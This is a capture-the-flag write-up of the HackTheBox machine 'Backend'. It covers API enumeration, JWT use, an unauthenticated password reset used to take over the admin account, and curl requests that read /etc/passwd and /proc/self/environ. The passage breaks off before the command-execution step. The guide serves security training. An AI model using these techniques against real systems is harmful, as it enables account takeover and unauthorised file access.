---
title: HTB: Backend
url: https://0xdf.gitlab.io/2022/04/12/htb-backend.html
date: 2022-04-12T09:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-backend, ctf, hackthebox, nmap, api, json, uvicorn, feroxbuster, wfuzz, swagger, fastapi, python, jwt, pyjwt, jwt-io, simple-modify-headers, burp, credentials, uhc
---

![Backend](https://0xdfimages.gitlab.io/img/backend-cover.png)

Backend was all about enumerating and abusing an API, first to get access to the Swagger docs, then to get admin access, and then debug access. From there it allows execution of commands, which provides a shell on the box. To escalate to root, I’ll find a root password in the application logs where the user must have put in their password to the name field.

## Box Info

| Name | [Backend](https://hackthebox.com/machines/backend)  [Backend](https://hackthebox.com/machines/backend) [Play on HackTheBox](https://hackthebox.com/machines/backend) |
| --- | --- |
| Release Date | 12 Apr 2022 |
| Retire Date | 12 Apr 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [ippsec ippsec](https://app.hackthebox.com/users/3769) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.161
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-11 15:24 UTC
Nmap scan report for 10.10.11.161
Host is up (0.094s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
oxdf@hacky$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.161
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-11 15:24 UTC
Nmap scan report for 10.10.11.161
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Mon, 11 Apr 2022 19:36:02 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Mon, 11 Apr 2022 19:35:50 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Mon, 11 Apr 2022 19:35:57 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
1 service unrecognized despite returning data. If you know the service/version,
...[snip]...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.01 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu focal 20.04.

### Website - TCP 80

#### Site

Visiting the page returns JSON data that Firefox displays:

![image-20220411112833859](https://0xdfimages.gitlab.io/img/image-20220411112833859.png)

With `curl`, it’s even clearer how simple the response is:

```

oxdf@hacky$ curl 10.10.11.161
{"msg":"UHC API Version 1.0"}

```

#### Tech Stack

The response headers show “uvicorn”:

```

HTTP/1.1 200 OK
date: Mon, 11 Apr 2022 19:40:34 GMT
server: uvicorn
content-length: 29
content-type: application/json
Connection: close

{"msg":"UHC API Version 1.0"}

```

`uvicorn` is a web server for hosting Python webservers, so that’s a good hint as to what kind of framework is running here. It could be Flask or Django, but it’s likely FastAPI.

#### API Brute Force

I can use my standard `feroxbuster` run against the site, but the default is much more tuned for finding pages on a website than finding API endpoints. For example, the default `feroxbuster` finds:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.161

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.161
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
401      GET        1l        2w       30c http://10.10.11.161/docs
200      GET        1l        1w       20c http://10.10.11.161/api
[####################] - 2m     29999/29999   0s      found:2       errors:0      
[####################] - 2m     29999/29999   247/s   http://10.10.11.161 

```

The 401 on `/docs` is an Unauthorized response. I need more access to get to the docs.

`feroxbuster` doesn’t recurrse down `/api`, though there’s almost certainly more there. That’s because `feroxbuster` only recurrses based on 2XX or 403 status code plus url ends in `/`, or 3xx (redirect) status code to the same locations with a trailing `/`. So when `/api` doesn’t end in a `/`, it doesn’t recurse (see the [feroxbuster update](#feroxbuster-updates) section later).

#### /api

Visiting `/api` returns a list of endpoints, in this case, containing one, `v1`:

![image-20220411144907095](https://0xdfimages.gitlab.io/img/image-20220411144907095.png)

`/api/v1` shows two more endpoints:

![image-20220411144932854](https://0xdfimages.gitlab.io/img/image-20220411144932854.png)

`/api/v1/admin` redirects to `/api/v1/admin/`, which then returns 401 Unauthorized. The redirect seems to be hinting that there’s more down this path, but that I’m not authorized to go.

Strangely, `/admin/v1/user` returns 404 not found. Adding a trailing `/` doesn’t change this. There’s likely more here as well.

#### Brute Force Strategy

When trying different endpoints here, I don’t know of a single nice tool for this. `feroxbuster` is nice because it let’s you give multiple HTTP methods, and it’s fast. But you have to identify status codes you want to see. There’s no way to say “show me everything that isn’t 404”. Based on some issues I was having on this box, the author of `feroxbuster` actually added some features, which aren’t quite live yet, but will be any day, and I’ll cover those
[here](#feroxbuster-updates).

When I was drafting this port originally, `wfuzz` gave much nicer granularity on what is displayed/filtered. Still, it’s much slower, and I’ll have to run it three times to do three different HTTP verbs.

It’s worth understanding the how each tool you use works so that when you collect information, you know exactly what it’s telling you, and what it might have missed.

#### /api/v1/admin Brute Force

Turning `feroxbuster` on this endpoint, I’ll have `feroxbuster` try GET, POST, and PUT requests. IT finds one new endpoint:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.161/api/v1/admin/ -m GET,POST,PUT

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.161/api/v1/admin/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET, POST, PUT]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
405      GET        1l        3w       31c http://10.10.11.161/api/v1/admin/file
[####################] - 6m     89997/89997   0s      found:1       errors:0      
[####################] - 6m     89997/89997   235/s   http://10.10.11.161/api/v1/admin/ 

```

`/file` is a Method Not Allowed response. Trying with `curl` shows the same:

```

oxdf@hacky$ curl http://10.10.11.161/api/v1/admin/file
{"detail":"Method Not Allowed"}

```

Switching from GET, PUT returns the same, but POST returns Not Authenticated:

```

oxdf@hacky$ curl http://10.10.11.161/api/v1/admin/file -X PUT
{"detail":"Method Not Allowed"}
oxdf@hacky$ curl http://10.10.11.161/api/v1/admin/file -X POST
{"detail":"Not authenticated"}

```

That seems to be a real endpoint to keep in mind.

#### /api/v1/user Brute Force

The default response for `/api/v1/user/FUZZ` is a 422 Unprocessable Entity:

```

000000001:   422        0 L      6 W      104 Ch      "cgi-bin"

```

Lookign at that endpoint in Firefox, it shows some information about the expected value there:

![image-20220411151549634](https://0xdfimages.gitlab.io/img/image-20220411151549634.png)

On first writing this post, `feroxbuster` didn’t have a way to show all responses except for a given list of codes, and I put in [this issue](https://github.com/epi052/feroxbuster/issues/535). [epi](https://twitter.com/epi052) actually reached out a few hours later with a version that should be out soon that does what I’ve asked, so I’ll show `feroxbuster` in the next section as well.

With `wfuzz`, hiding 422 responses:

```

oxdf@hacky$ wfuzz -u http://10.10.11.161/api/v1/user/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 422
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.161/api/v1/user/FUZZ
Total requests: 30000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000168:   200        0 L      1 W      4 Ch        "2010"
000000188:   200        0 L      1 W      4 Ch        "404"
000000208:   200        0 L      1 W      4 Ch        "2009"
000000219:   200        0 L      1 W      4 Ch        "2011"
000000248:   200        0 L      1 W      4 Ch        "2008"
000000302:   200        0 L      1 W      4 Ch        "2007"
000000396:   200        0 L      1 W      141 Ch      "1"
000000430:   200        0 L      1 W      4 Ch        "9"
000000432:   200        0 L      1 W      4 Ch        "7"
000000434:   200        0 L      1 W      4 Ch        "5"
000000438:   200        0 L      1 W      144 Ch      "2"
000000446:   200        0 L      1 W      4 Ch        "3"
000000459:   200        0 L      1 W      4 Ch        "8"
000000473:   200        0 L      1 W      4 Ch        "2012"
000000474:   200        0 L      1 W      4 Ch        "2006"
000000503:   422        0 L      6 W      104 Ch      "scgi-bin"
^C
Finishing pending requests...

```

I’ll kill that after a minute. It seems that any integer is returning 200, and most of 4 characters long. These are returning `null`:

![image-20220411151755631](https://0xdfimages.gitlab.io/img/image-20220411151755631.png)

There are two users on the box with non-null responses:

```

oxdf@hacky$ curl -s http://10.10.11.161/api/v1/user/1 | jq .
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}
oxdf@hacky$ curl -s http://10.10.11.161/api/v1/user/2 | jq .
{
  "guid": "3c0d83a0-877a-46e5-bd01-18908f6ebee6",
  "email": "root@ippsec.rocks",
  "date": null,
  "time_created": 1649717405121,
  "is_superuser": false,
  "id": 2
}

```

User with id 1 is the admin, and is a superuser.

I can’t find much else here with a GET, but it’s important to check other methods as well. Starting fresh, I’ll look at POST request, and it seems like the default is a 405 Method not allowed. I’ll hide those (`--hc 405`), and run:

```

oxdf@hacky$ wfuzz -X POST -u http://10.10.11.161/api/v1/user/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 405
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.161/api/v1/user/FUZZ
Total requests: 30000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000039:   422        0 L      3 W      172 Ch      "login"
000000489:   422        0 L      2 W      81 Ch       "signup"
...[snip]...

```

Pretty quickly some interesting endpoints come back, like `/login` and `/signup` (the rest were false positives).

#### feroxbuster Updates

[epi](https://twitter.com/epi052) updated `feroxbuster` based on the issues I was having on Backend. Using a preview build of a soon to be released version, I’ll show some of the same enumeration as above. For the `user` path, I’ll start with just ignoring HTTP 404s (because the path doesn’t exist), and quickly find a few other things that need ruling out:
- The 422s that of 104 characters for GET requests that aren’t numeric.
- The 4 character `null` responses for numbers that don’t have a user.
- 405s on POST requests to `/api/v1/user/[non-numeric]`.

It’s worth thinking about how to filter. I 404 seems like an obvious filter - I don’t want things that don’t exist. I could go either way with 405. In this case, it generates a ton of false positives on the GET request, so I’m going to ignore it. However, I could also break GET and POST into separate runs and just ignore it on GET. I could filter 422, but that’s potentially more errors than just what I’m seeing on the non-numeric GET. If it finds some other endpoint that the parameters are wrong for, I don’t want to miss that, so I’ll filter that one by character length instead.

Those decisions lead to this run with `-C 404,405 -m GET,POST -S 4,104`:

```

oxdf@hacky$ ./feroxbuster -u http://10.10.11.161/api/v1/user -C 404,405 -m GET,POST -S 4,104

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.6.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.161/api/v1/user
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.6.4
 💢  Size Filter           │ 4
 💢  Size Filter           │ 104
 🏁  HTTP methods          │ [GET, POST]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
422     POST        1l        3w      172c http://10.10.11.161/api/v1/user/login
200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/1
200      GET        1l        1w      144c http://10.10.11.161/api/v1/user/2
200      GET        1l        1w      139c http://10.10.11.161/api/v1/user/3
422     POST        1l        2w       81c http://10.10.11.161/api/v1/user/signup  
200      GET        1l        1w      139c http://10.10.11.161/api/v1/user/03
200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/01       
200      GET        1l        1w      144c http://10.10.11.161/api/v1/user/02      
200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/001     
200      GET        1l        1w      144c http://10.10.11.161/api/v1/user/002
200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/0001
200      GET        1l        1w      139c http://10.10.11.161/api/v1/user/003
[####################] - 4m     60000/60000   0s      found:12      errors:0
[####################] - 4m     60000/60000   245/s   http://10.10.11.161/api/v1/user

```

Finds the existing users (my user registered later is id 3), as well as `login` and `signup`!

There’s also now a `--force-recursion` switch, which will recurse down anything that matches the filter, instead of only things that look like directories. If I start with this at `/api`, it will find `admin` and even the `file` endpoint, but not the `user` path, as that returns 404.

```

oxdf@hacky$ ./feroxbuster -u http://10.10.11.161/api --force-recursion

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.161/api
 🚀  Threads               │ 50                
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🤘  Force Recursion       │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        1w       20c http://10.10.11.161/api
200      GET        1l        1w       30c http://10.10.11.161/api/v1
307      GET        0l        0w        0c http://10.10.11.161/api/v1/admin => http://10.10.11.161/api/v1/admin/
405      GET        1l        3w       31c http://10.10.11.161/api/v1/admin/file
[####################] - 3m    120000/120000  0s      found:4       errors:0      
[####################] - 2m     30000/30000   171/s   http://10.10.11.161/api 
[####################] - 2m     30000/30000   170/s   http://10.10.11.161/api/v1 
[####################] - 2m     30000/30000   170/s   http://10.10.11.161/api/v1/admin 
[####################] - 2m     30000/30000   170/s   http://10.10.11.161/api/v1/admin/file 

```

All of which is to say, these are useful options to have, and you still want to know what you’re tools are doing when enumerating an API.

## Shell as htb

### Access Docs

#### Register

I’ll switch to `curl` and try a POST to `/api/v1/user/signup`:

```

oxdf@hacky$ curl -v http://10.10.11.161/api/v1/user/signup -X POST
*   Trying 10.10.11.161:80...
* TCP_NODELAY set
* Connected to 10.10.11.161 (10.10.11.161) port 80 (#0)
> POST /api/v1/user/signup HTTP/1.1
> Host: 10.10.11.161
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 422 Unprocessable Entity
< date: Mon, 11 Apr 2022 23:52:13 GMT
< server: uvicorn
< content-length: 81
< content-type: application/json
< 
* Connection #0 to host 10.10.11.161 left intact
{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}

```

It returns 422 Unprocessable Entity, and the message say a field is required in the body. It’s more clear using `jq` to print the results:

```

oxdf@hacky$ curl http://10.10.11.161/api/v1/user/signup -X POST -s | jq .
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}

```

I’ll try adding a POST body, and there’s a new message:

```

oxdf@hacky$ curl -s -X POST -d '0xdf' http://10.10.11.161/api/v1/user/signup | jq .
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "value is not a valid dict",
      "type": "type_error.dict"
    }
  ]
}

```

Knowing this is a Python webserver, I’ll switch to JSON and give it a dict, which is of the format `{"key": "value"}`.

```

oxdf@hacky$ curl -s -X POST -d '{"key": "value"}' http://10.10.11.161/api/v1/user/signup | jq .
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "value is not a valid dict",
      "type": "type_error.dict"
    }
  ]
}

```

It gave the same response. That’s because for it to process JSON, I have to give a `Content-Type` header that says the body is JSON. That brings the next message:

```

oxdf@hacky$ curl -s -X POST -d '{"key": "value"}' http://10.10.11.161/api/v1/user/signup -H "Content-Type: application/json" | jq .
{
  "detail": [
    {
      "loc": [
        "body",
        "email"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}

```

It’s missing “body/email” and “body/password”. It’s not exactly clear where those go, but I’m able to get it pretty quickly:

```

oxdf@hacky$ curl -v -s -X POST -d '{"email": "0xdf@htb.htb", "password": "0xdf0xdf"}' http://10.10.11.161/api/v1/user/signup -H "Content-Type: application/json" | jq .
*   Trying 10.10.11.161:80...
* TCP_NODELAY set
* Connected to 10.10.11.161 (10.10.11.161) port 80 (#0)
> POST /api/v1/user/signup HTTP/1.1
> Host: 10.10.11.161
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 49
> 
} [49 bytes data]
* upload completely sent off: 49 out of 49 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 201 Created
< date: Mon, 11 Apr 2022 23:58:06 GMT
< server: uvicorn
< content-length: 2
< content-type: application/json
< 
{ [2 bytes data]
* Connection #0 to host 10.10.11.161 left intact
{}

```

The response is a 201 Created, and it returns an empty dict.

#### Login

If that worked and I have an account, I’ll try a similar methodology on the `/api/v1/user/login` endpoint. This one goes right to is missing username and password, without first complaining about the lack of a body or that the body isn’t a `dict`:

```

oxdf@hacky$ curl -s -X POST http://10.10.11.161/api/v1/user/login | jq .
{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}

```

I’ll assume username is the email I gave on registering. My first thought was to try just what I did above:

```

oxdf@hacky$ curl -s -d '{"username": "0xdf@htb.htb", "password": "0xdf0xdf"}' -X POST http://10.10.11.161/api/v1/user/login -H "Content-Type: application/json" | jq .
{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}

```

It doesn’t work.

Given the different error messages, perhaps it’s set to use a standard HTTP body. That worked:

```

oxdf@hacky$ curl -s -d 'username=0xdf@htb.htb&password=0xdf0xdf' http://10.10.11.161/api/v1/user/login | jq .
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDEzMTMwLCJpYXQiOjE2NDk3MjE5MzAsInN1YiI6IjMiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiNTg4MjI2N2YtYTA2My00MzZiLWE5NmUtNTIyZjk2ZjNkOTY5In0.Y6OfDmvwWEHsZhtwxZqN2X6-q29B5C2dYDRIhOik_jo",
  "token_type": "bearer"
}

```

It returned an access token of the type bearer.

#### Use Token

The token looks to be a JWT token (though it could be a flask cookie). The quickest way to check is to drop it into [jwt.io](https://jwt.io/) and see that it is a JWT:

[![image-20220411155743806](https://0xdfimages.gitlab.io/img/image-20220411155743806.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220411155743806.png)

The standard way to use a bearer token is to include an `Authorization` header, with the string `bearer [token]`. That works here as I can now access `/docs`:

```

oxdf@hacky$ curl http://10.10.11.161/docs -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDEzMTMwLCJpYXQiOjE2NDk3MjE5MzAsInN1YiI6IjMiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiNTg4MjI2N2YtYTA2My00MzZiLWE5NmUtNTIyZjk2ZjNkOTY5In0.Y6OfDmvwWEHsZhtwxZqN2X6-q29B5C2dYDRIhOik_jo"

    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>docs</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,

    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>

```

#### Use In Firefox

The docs look to be JavaScript generated. To see them, I’ll want to get in with Firefox. One way is to add a plugin like [simple-modify-headers](https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/). I’ll configure it for Backend, and turn it on:

![image-20220411160523272](https://0xdfimages.gitlab.io/img/image-20220411160523272.png)

The other way would be to just catch the request for `/docs` in Burp, and add the header. There’s actually a second request to `/openapi.json` which needs the auth as well. After adding that to both, the page will load.

Either way the docs page can be accessed:

[![image-20220411160722892](https://0xdfimages.gitlab.io/img/image-20220411160722892.png)](https://0xdfimages.gitlab.io/img/image-20220411160722892.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220411160722892.png)

### Admin Access

#### Docs

The docs generated by Swagger for FastAPI are fully interactive. If I expand one of the API endpoints, and click “Try It Out” and then Execute”, it will run the endpoint, showing both the request and response:

![image-20220411170317575](https://0xdfimages.gitlab.io/img/image-20220411170317575.png)

Some of the endpoints have locks next to them:

![image-20220411170354018](https://0xdfimages.gitlab.io/img/image-20220411170354018.png)

Clicking on the doc will pop a form where I can login:

![image-20220411170421737](https://0xdfimages.gitlab.io/img/image-20220411170421737.png)

Now these endpoints will run from within the docs as well.

#### Enumerate API Endpoints

Looking through all the endpoints, they are broken into three groups. default has the docs, and `/api`, and `/api/v1`. Nothing really interesting here.

user has `/api/v1/user` endpoints, including `{user_id}` to get a user, `login`, and `signup`, that I’ve enumerated already, as well as a couple more.

![image-20220411171412351](https://0xdfimages.gitlab.io/img/image-20220411171412351.png)

There’s also an admin section which includes the `file` endpoint `feroxbuster` found, and two others:

![image-20220411171754313](https://0xdfimages.gitlab.io/img/image-20220411171754313.png)

#### admin Endpoints

All three of these require auth, but since I have auth, I’ll give them a try. First there’s “Admin Check” (`/api/v1/admin/`), which:

> Returns true if the user is admin

Unsurprisingly, it returns false:

![image-20220411171958857](https://0xdfimages.gitlab.io/img/image-20220411171958857.png)

“Get File” (`/api/v1/admin/file`) is next, and it:

> Returns a file on the server

I’ll give it `/etc/passwd`, but it returns a permission error:

![image-20220411172347159](https://0xdfimages.gitlab.io/img/image-20220411172347159.png)

It seems like I need admin privs to use this (which makes sense).

“Run Command” (`/api/v1/admin/exec/{command}`) says it:

> Executes a command. Requires Debug Permissions.

Running it returns a 400 Bad Request:

![image-20220411173139825](https://0xdfimages.gitlab.io/img/image-20220411173139825.png)

It seems to use `exec` I’ll need an updated JWT.

#### user Endpoints

The only two user end point I haven’t looked at are `SecretFlagEndpoint` and `updatepass`.

“Get Flag” (`/api/v1/user/SecretFlagEndpoint`) takes no input and returns a string:

![image-20220411170620487](https://0xdfimages.gitlab.io/img/image-20220411170620487.png)

On trying it, it returns `user.txt`:

![image-20220411170713345](https://0xdfimages.gitlab.io/img/image-20220411170713345.png)

“Update Password” (`/api/v1/user/updatepass`) takes a JSON body with `guid` and `password`:

![image-20220411171500284](https://0xdfimages.gitlab.io/img/image-20220411171500284.png)

This endpoint doesn’t even seem to need auth!? I’ll fetch the admin’s guid using the “Fetch User” endpoint:

```

oxdf@hacky$ curl -s http://10.10.11.161/api/v1/user/1 | jq .
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}

```

Clicking “Try It Out” pops a field to input the JSON body, which I’ll fill out with the `guid` for the admin user and a new `password`, and hit “Execute”. It returns a 201:

![image-20220411173908260](https://0xdfimages.gitlab.io/img/image-20220411173908260.png)

Looking down a bit at the documentation, 201 is success:

![image-20220411173929182](https://0xdfimages.gitlab.io/img/image-20220411173929182.png)

I’ll head back up to the “Authorize” button, and this time give it the admin info (with the newly set password):

![image-20220411174017081](https://0xdfimages.gitlab.io/img/image-20220411174017081.png)

On clicking “Authorize”, it seems to work:

![image-20220411174033160](https://0xdfimages.gitlab.io/img/image-20220411174033160.png)

Now `/api/v1/admin/` confirms it:

![image-20220411174201449](https://0xdfimages.gitlab.io/img/image-20220411174201449.png)

### Debug Access

#### File Read

From here, I still get the same error on `/api/v1/admin/exec/{command}`. But I can now read files:

![image-20220411174303071](https://0xdfimages.gitlab.io/img/image-20220411174303071.png)

I’ll switch to `curl` with `jq` to print files:

```

oxdf@hacky$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.gv-3xaN_zUwMcLcLbxBUSmvJnJC3g4raKl9AJip19gU' -H 'Content-Type: application/json' -d '{"file": "/etc/passwd"}' | jq -r '.file'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...[snip]...

```

To get the location of the web server code, I’ll read the environment of the current process at `/proc/self/environ`:

```

oxdf@hacky$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.gv-3xaN_zUwMcLcLbxBUSmvJnJC3g4raKl9AJip19gU' -H 'Content-Type: application/json' -d '{"file": "/proc/self/environ"}' | jq -r '.file'
APP_MODULE=app.main:appPWD=/home/htb/uhcLOGNAME=htbPORT=80HOME=/home/htbLANG=C.UTF-8VIRTUAL_ENV=/home/htb/uhc/.venvINVOCATION_ID=741857a2d11441b39840b71412462b22HOST=0.0.0.0USER=htbSHLVL=0PS1=(.venv) JOURNAL_STREAM=9:18716PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binOLDPWD=/

```

It’s a bit jammed together, but the first two are:

```

APP_MODULE=app.main:app
PWD=/home/htb/uhc

```

That says the working directory is `/home/htb/uhc`, and that the app is located likely in `app/main.py`. I’ll give that a try, and it works:

```

